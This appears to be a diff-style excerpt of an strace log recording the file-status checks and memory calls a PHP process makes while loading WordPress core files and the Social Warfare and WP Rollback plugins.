+stat("/var/www/html/wp-includes/class-wp-comment-query.php", {st_mode=S_IFREG|0644, st_size=41743, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-comment.php", {st_mode=S_IFREG|0644, st_size=11173, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-comment.php", {st_mode=S_IFREG|0644, st_size=11173, ...}) = 0
+lstat("/var/www/html/wp-includes/comment-template.php", {st_mode=S_IFREG|0644, st_size=87441, ...}) = 0
+stat("/var/www/html/wp-includes/comment-template.php", {st_mode=S_IFREG|0644, st_size=87441, ...}) = 0
+lstat("/var/www/html/wp-includes/rewrite.php", {st_mode=S_IFREG|0644, st_size=17502, ...}) = 0
+stat("/var/www/html/wp-includes/rewrite.php", {st_mode=S_IFREG|0644, st_size=17502, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-rewrite.php", {st_mode=S_IFREG|0644, st_size=58908, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-rewrite.php", {st_mode=S_IFREG|0644, st_size=58908, ...}) = 0
+lstat("/var/www/html/wp-includes/feed.php", {st_mode=S_IFREG|0644, st_size=19550, ...}) = 0
+stat("/var/www/html/wp-includes/feed.php", {st_mode=S_IFREG|0644, st_size=19550, ...}) = 0
+lstat("/var/www/html/wp-includes/bookmark.php", {st_mode=S_IFREG|0644, st_size=13672, ...}) = 0
+stat("/var/www/html/wp-includes/bookmark.php", {st_mode=S_IFREG|0644, st_size=13672, ...}) = 0
+lstat("/var/www/html/wp-includes/bookmark-template.php", {st_mode=S_IFREG|0644, st_size=11699, ...}) = 0
+stat("/var/www/html/wp-includes/bookmark-template.php", {st_mode=S_IFREG|0644, st_size=11699, ...}) = 0
+lstat("/var/www/html/wp-includes/kses.php", {st_mode=S_IFREG|0644, st_size=50148, ...}) = 0
+stat("/var/www/html/wp-includes/kses.php", {st_mode=S_IFREG|0644, st_size=50148, ...}) = 0
+lstat("/var/www/html/wp-includes/cron.php", {st_mode=S_IFREG|0644, st_size=16467, ...}) = 0
+stat("/var/www/html/wp-includes/cron.php", {st_mode=S_IFREG|0644, st_size=16467, ...}) = 0
+lstat("/var/www/html/wp-includes/deprecated.php", {st_mode=S_IFREG|0644, st_size=113222, ...}) = 0
+stat("/var/www/html/wp-includes/deprecated.php", {st_mode=S_IFREG|0644, st_size=113222, ...}) = 0
+lstat("/var/www/html/wp-includes/script-loader.php", {st_mode=S_IFREG|0644, st_size=79370, ...}) = 0
+stat("/var/www/html/wp-includes/script-loader.php", {st_mode=S_IFREG|0644, st_size=79370, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-dependency.php", {st_mode=S_IFREG|0644, st_size=1550, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-dependency.php", {st_mode=S_IFREG|0644, st_size=1550, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-dependencies.php", {st_mode=S_IFREG|0644, st_size=11185, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-dependencies.php", {st_mode=S_IFREG|0644, st_size=11185, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=14160, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=14160, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=11481, ...}) = 0
+stat("/var/www/html/wp-includes/functions.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=11481, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-styles.php", {st_mode=S_IFREG|0644, st_size=9794, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-styles.php", {st_mode=S_IFREG|0644, st_size=9794, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.wp-styles.php", {st_mode=S_IFREG|0644, st_size=8080, ...}) = 0
+stat("/var/www/html/wp-includes/functions.wp-styles.php", {st_mode=S_IFREG|0644, st_size=8080, ...}) = 0
+lstat("/var/www/html/wp-includes/taxonomy.php", {st_mode=S_IFREG|0644, st_size=149381, ...}) = 0
+stat("/var/www/html/wp-includes/taxonomy.php", {st_mode=S_IFREG|0644, st_size=149381, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-taxonomy.php", {st_mode=S_IFREG|0644, st_size=9993, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-taxonomy.php", {st_mode=S_IFREG|0644, st_size=9993, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-term.php", {st_mode=S_IFREG|0644, st_size=5273, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-term.php", {st_mode=S_IFREG|0644, st_size=5273, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-term-query.php", {st_mode=S_IFREG|0644, st_size=33619, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-term-query.php", {st_mode=S_IFREG|0644, st_size=33619, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-tax-query.php", {st_mode=S_IFREG|0644, st_size=19199, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-tax-query.php", {st_mode=S_IFREG|0644, st_size=19199, ...}) = 0
+lstat("/var/www/html/wp-includes/update.php", {st_mode=S_IFREG|0644, st_size=24613, ...}) = 0
+stat("/var/www/html/wp-includes/update.php", {st_mode=S_IFREG|0644, st_size=24613, ...}) = 0
+lstat("/var/www/html/wp-includes/canonical.php", {st_mode=S_IFREG|0644, st_size=27583, ...}) = 0
+stat("/var/www/html/wp-includes/canonical.php", {st_mode=S_IFREG|0644, st_size=27583, ...}) = 0
+lstat("/var/www/html/wp-includes/shortcodes.php", {st_mode=S_IFREG|0644, st_size=20441, ...}) = 0
+stat("/var/www/html/wp-includes/shortcodes.php", {st_mode=S_IFREG|0644, st_size=20441, ...}) = 0
+lstat("/var/www/html/wp-includes/embed.php", {st_mode=S_IFREG|0644, st_size=44348, ...}) = 0
+stat("/var/www/html/wp-includes/embed.php", {st_mode=S_IFREG|0644, st_size=44348, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-embed.php", {st_mode=S_IFREG|0644, st_size=14509, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-embed.php", {st_mode=S_IFREG|0644, st_size=14509, ...}) = 0
+lstat("/var/www/html/wp-includes/class-oembed.php", {st_mode=S_IFREG|0644, st_size=33112, ...}) = 0
+stat("/var/www/html/wp-includes/class-oembed.php", {st_mode=S_IFREG|0644, st_size=33112, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-oembed-controller.php", {st_mode=S_IFREG|0644, st_size=5587, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-oembed-controller.php", {st_mode=S_IFREG|0644, st_size=5587, ...}) = 0
+lstat("/var/www/html/wp-includes/media.php", {st_mode=S_IFREG|0644, st_size=138392, ...}) = 0
+stat("/var/www/html/wp-includes/media.php", {st_mode=S_IFREG|0644, st_size=138392, ...}) = 0
+lstat("/var/www/html/wp-includes/http.php", {st_mode=S_IFREG|0644, st_size=22231, ...}) = 0
+stat("/var/www/html/wp-includes/http.php", {st_mode=S_IFREG|0644, st_size=22231, ...}) = 0
+lstat("/var/www/html/wp-includes/class-http.php", {st_mode=S_IFREG|0644, st_size=36164, ...}) = 0
+stat("/var/www/html/wp-includes/class-http.php", {st_mode=S_IFREG|0644, st_size=36164, ...}) = 0
+lstat("/var/www/html/wp-includes/class-requests.php", {st_mode=S_IFREG|0644, st_size=29790, ...}) = 0
+stat("/var/www/html/wp-includes/class-requests.php", {st_mode=S_IFREG|0644, st_size=29790, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-streams.php", {st_mode=S_IFREG|0644, st_size=14995, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-streams.php", {st_mode=S_IFREG|0644, st_size=14995, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-curl.php", {st_mode=S_IFREG|0644, st_size=11679, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-curl.php", {st_mode=S_IFREG|0644, st_size=11679, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-proxy.php", {st_mode=S_IFREG|0644, st_size=5957, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-proxy.php", {st_mode=S_IFREG|0644, st_size=5957, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-cookie.php", {st_mode=S_IFREG|0644, st_size=6456, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-cookie.php", {st_mode=S_IFREG|0644, st_size=6456, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-encoding.php", {st_mode=S_IFREG|0644, st_size=6444, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-encoding.php", {st_mode=S_IFREG|0644, st_size=6444, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-response.php", {st_mode=S_IFREG|0644, st_size=2871, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-response.php", {st_mode=S_IFREG|0644, st_size=2871, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-requests-response.php", {st_mode=S_IFREG|0644, st_size=4273, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-requests-response.php", {st_mode=S_IFREG|0644, st_size=4273, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-requests-hooks.php", {st_mode=S_IFREG|0644, st_size=1872, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-requests-hooks.php", {st_mode=S_IFREG|0644, st_size=1872, ...}) = 0
+access("/var/www/html/wp-includes/Requests/Hooks.php", F_OK) = 0
+stat("/var/www/html/wp-includes/Requests/Hooks.php", {st_mode=S_IFREG|0644, st_size=1399, ...}) = 0
+access("/var/www/html/wp-includes/Requests/Hooker.php", F_OK) = 0
+stat("/var/www/html/wp-includes/Requests/Hooker.php", {st_mode=S_IFREG|0644, st_size=708, ...}) = 0
+lstat("/var/www/html/wp-includes/widgets.php", {st_mode=S_IFREG|0644, st_size=55411, ...}) = 0
+stat("/var/www/html/wp-includes/widgets.php", {st_mode=S_IFREG|0644, st_size=55411, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-widget.php", {st_mode=S_IFREG|0644, st_size=17658, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-widget.php", {st_mode=S_IFREG|0644, st_size=17658, ...}) = 0
+mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f85cc85f000
+munmap(0x7f85cc85f000, 2097152)         = 0
+mmap(NULL, 4190208, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f85cc1fb000
+munmap(0x7f85cc1fb000, 20480)           = 0
+munmap(0x7f85cc400000, 2072576)         = 0
+madvise(0x7f85cc200000, 2097152, MADV_HUGEPAGE) = 0
+lstat("/var/www/html/wp-includes/class-wp-widget-factory.php", {st_mode=S_IFREG|0644, st_size=3746, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-widget-factory.php", {st_mode=S_IFREG|0644, st_size=3746, ...}) = 0
+lstat("/var/www/html/wp-includes/nav-menu.php", {st_mode=S_IFREG|0644, st_size=39526, ...}) = 0
+stat("/var/www/html/wp-includes/nav-menu.php", {st_mode=S_IFREG|0644, st_size=39526, ...}) = 0
+lstat("/var/www/html/wp-includes/nav-menu-template.php", {st_mode=S_IFREG|0644, st_size=20871, ...}) = 0
+stat("/var/www/html/wp-includes/nav-menu-template.php", {st_mode=S_IFREG|0644, st_size=20871, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-nav-menu.php", {st_mode=S_IFREG|0644, st_size=8392, ...}) = 0
+lstat("/var/www/html/wp-includes/admin-bar.php", {st_mode=S_IFREG|0644, st_size=28650, ...}) = 0
+stat("/var/www/html/wp-includes/admin-bar.php", {st_mode=S_IFREG|0644, st_size=28650, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api.php", {st_mode=S_IFREG|0644, st_size=38533, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api.php", {st_mode=S_IFREG|0644, st_size=38533, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-server.php", {st_mode=S_IFREG|0644, st_size=38441, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-server.php", {st_mode=S_IFREG|0644, st_size=38441, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-response.php", {st_mode=S_IFREG|0644, st_size=7339, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-response.php", {st_mode=S_IFREG|0644, st_size=7339, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-request.php", {st_mode=S_IFREG|0644, st_size=23903, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-request.php", {st_mode=S_IFREG|0644, st_size=23903, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-controller.php", {st_mode=S_IFREG|0644, st_size=18049, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-controller.php", {st_mode=S_IFREG|0644, st_size=18049, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php", {st_mode=S_IFREG|0644, st_size=73947, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php", {st_mode=S_IFREG|0644, st_size=73947, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php", {st_mode=S_IFREG|0644, st_size=23564, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php", {st_mode=S_IFREG|0644, st_size=23564, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php", {st_mode=S_IFREG|0644, st_size=8902, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php", {st_mode=S_IFREG|0644, st_size=8902, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php", {st_mode=S_IFREG|0644, st_size=9119, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php", {st_mode=S_IFREG|0644, st_size=9119, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php", {st_mode=S_IFREG|0644, st_size=17041, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php", {st_mode=S_IFREG|0644, st_size=17041, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php", {st_mode=S_IFREG|0644, st_size=9947, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php", {st_mode=S_IFREG|0644, st_size=9947, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php", {st_mode=S_IFREG|0644, st_size=30497, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php", {st_mode=S_IFREG|0644, st_size=30497, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php", {st_mode=S_IFREG|0644, st_size=43594, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php", {st_mode=S_IFREG|0644, st_size=43594, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php", {st_mode=S_IFREG|0644, st_size=53746, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php", {st_mode=S_IFREG|0644, st_size=53746, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php", {st_mode=S_IFREG|0644, st_size=10155, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php", {st_mode=S_IFREG|0644, st_size=10155, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-meta-fields.php", {st_mode=S_IFREG|0644, st_size=13189, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-meta-fields.php", {st_mode=S_IFREG|0644, st_size=13189, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php", {st_mode=S_IFREG|0644, st_size=702, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php", {st_mode=S_IFREG|0644, st_size=702, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1016, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1016, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1014, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1014, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php", {st_mode=S_IFREG|0644, st_size=675, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php", {st_mode=S_IFREG|0644, st_size=675, ...}) = 0
+stat("/var/www/html/wp-content/mu-plugins", 0x7ffd088e3460) = -1 ENOENT (No such file or directory)
+lstat("/var/www/html/wp-includes/vars.php", {st_mode=S_IFREG|0644, st_size=5582, ...}) = 0
+stat("/var/www/html/wp-includes/vars.php", {st_mode=S_IFREG|0644, st_size=5582, ...}) = 0
+access("/var/www/html/wp-content/themes", F_OK) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", F_OK) = 0
+access("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", F_OK) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", {st_mode=S_IFREG|0644, st_size=1416, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", {st_mode=S_IFREG|0644, st_size=1416, ...}) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/lib/legacy/update-checker.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/Social_Warfare.php", {st_mode=S_IFREG|0644, st_size=14517, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/functions.php", {st_mode=S_IFREG|0644, st_size=1356, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", {st_mode=S_IFREG|0644, st_size=25311, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/wp-rollback", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", {st_mode=S_IFREG|0644, st_size=25311, ...}) = 0
+lstat("/var/www/html/wp-includes/pluggable.php", {st_mode=S_IFREG|0644, st_size=92000, ...}) = 0
+stat("/var/www/html/wp-includes/pluggable.php", {st_mode=S_IFREG|0644, st_size=92000, ...}) = 0
+lstat("/var/www/html/wp-includes/pluggable-deprecated.php", {st_mode=S_IFREG|0644, st_size=6262, ...}) = 0
+stat("/var/www/html/wp-includes/pluggable-deprecated.php", {st_mode=S_IFREG|0644, st_size=6262, ...}) = 0
+stat("/var/www/html/wp-includes/default-widgets.php", {st_mode=S_IFREG|0644, st_size=2180, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-pages.php", {st_mode=S_IFREG|0644, st_size=4883, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-links.php", {st_mode=S_IFREG|0644, st_size=6903, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-search.php", {st_mode=S_IFREG|0644, st_size=2608, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-archives.php", {st_mode=S_IFREG|0644, st_size=5429, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media.php", {st_mode=S_IFREG|0644, st_size=13815, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-audio.php", {st_mode=S_IFREG|0644, st_size=5937, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-image.php", {st_mode=S_IFREG|0644, st_size=11186, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-video.php", {st_mode=S_IFREG|0644, st_size=8155, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-gallery.php", {st_mode=S_IFREG|0644, st_size=6194, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-meta.php", {st_mode=S_IFREG|0644, st_size=3593, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-calendar.php", {st_mode=S_IFREG|0644, st_size=2872, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-text.php", {st_mode=S_IFREG|0644, st_size=20080, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-categories.php", {st_mode=S_IFREG|0644, st_size=5951, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-recent-posts.php", {st_mode=S_IFREG|0644, st_size=4973, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-recent-comments.php", {st_mode=S_IFREG|0644, st_size=5827, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-rss.php", {st_mode=S_IFREG|0644, st_size=3687, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-tag-cloud.php", {st_mode=S_IFREG|0644, st_size=5668, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-nav-menu-widget.php", {st_mode=S_IFREG|0644, st_size=5339, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-custom-html.php", {st_mode=S_IFREG|0644, st_size=11831, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/Social_Warfare_Addon.php", {st_mode=S_IFREG|0644, st_size=9207, ...}) = 0
+stat("/var/www/html/wp-admin/includes/plugin.php", {st_mode=S_IFREG|0644, st_size=66722, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Debug_Trait.php", {st_mode=S_IFREG|0644, st_size=2515, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Compatibility.php", {st_mode=S_IFREG|0644, st_size=2307, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_CURL.php", {st_mode=S_IFREG|0644, st_size=4306, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Localization.php", {st_mode=S_IFREG|0644, st_size=997, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Permalink.php", {st_mode=S_IFREG|0644, st_size=6972, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Database_Migration.php", {st_mode=S_IFREG|0644, st_size=26328, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_URL_Management.php", {st_mode=S_IFREG|0644, st_size=13054, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Notice.php", {st_mode=S_IFREG|0644, st_size=12146, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Notice_Loader.php", {st_mode=S_IFREG|0644, st_size=4256, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Post_Cache_Loader.php", {st_mode=S_IFREG|0644, st_size=2877, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Post_Cache.php", {st_mode=S_IFREG|0644, st_size=23139, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_JSON_Cache_Handler.php", {st_mode=S_IFREG|0644, st_size=3039, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Plugin_Updater.php", {st_mode=S_IFREG|0644, st_size=15637, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Utility.php", {st_mode=S_IFREG|0644, st_size=13610, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Auth_Helper.php", {st_mode=S_IFREG|0644, st_size=5086, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Credential_Helper.php", {st_mode=S_IFREG|0644, st_size=5706, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Social_Networks_Loader.php", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Social_Network.php", {st_mode=S_IFREG|0644, st_size=14108, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Google_Plus.php", {st_mode=S_IFREG|0644, st_size=1471, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Facebook.php", {st_mode=S_IFREG|0644, st_size=5765, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Twitter.php", {st_mode=S_IFREG|0644, st_size=9218, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Linkedin.php", {st_mode=S_IFREG|0644, st_size=1115, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Pinterest.php", {st_mode=S_IFREG|0644, st_size=7424, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Mix.php", {st_mode=S_IFREG|0644, st_size=1953, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Trait.php", {st_mode=S_IFREG|0644, st_size=25334, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel.php", {st_mode=S_IFREG|0644, st_size=19735, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Side.php", {st_mode=S_IFREG|0644, st_size=4239, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Loader.php", {st_mode=S_IFREG|0644, st_size=11252, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Shortcode.php", {st_mode=S_IFREG|0644, st_size=2027, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Header_Output.php", {st_mode=S_IFREG|0644, st_size=4508, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Script.php", {st_mode=S_IFREG|0644, st_size=8239, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Shortcode.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Popular_Posts_Widget.php", {st_mode=S_IFREG|0644, st_size=19850, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Widget.php", {st_mode=S_IFREG|0644, st_size=4402, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Widget_Loader.php", {st_mode=S_IFREG|0644, st_size=1128, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Click_To_Tweet.php", {st_mode=S_IFREG|0644, st_size=3606, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Column.php", {st_mode=S_IFREG|0644, st_size=4022, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Settings_Link.php", {st_mode=S_IFREG|0644, st_size=1378, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Shortcode_Generator.php", {st_mode=S_IFREG|0644, st_size=3147, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_User_Profile.php", {st_mode=S_IFREG|0644, st_size=4016, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Sidebar_Loader.php", {st_mode=S_IFREG|0644, st_size=1313, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_User_Options.php", {st_mode=S_IFREG|0644, st_size=11922, ...}) = 0
